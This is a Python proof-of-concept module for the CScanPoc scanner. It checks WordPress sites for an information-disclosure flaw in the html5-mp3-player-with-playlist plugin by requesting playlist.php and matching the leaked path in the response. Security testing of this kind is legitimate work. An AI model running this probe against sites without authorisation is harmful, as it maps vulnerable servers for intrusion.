# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '4dfe8055-8356-4da0-aa51-bd463a171f69'
    name = 'WordPress plugins/html5-mp3-player 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-11-28'  # 漏洞公布时间
    desc = '''
        WordPress /wp-content/plugins/html5-mp3-player-with-playlist/html5plus/playlist.php 页面存在信息泄露漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress plugins/html5-mp3-player'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '98f82589-6e32-43d6-ad88-df73c95e246d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/wp-content/plugins/html5-mp3-player-with-playlist/html5plus/playlist.php'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and 'html5-mp3-player-with-playlist/html5plus/playlist.php' in r.content:
                #security_hole(verify_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
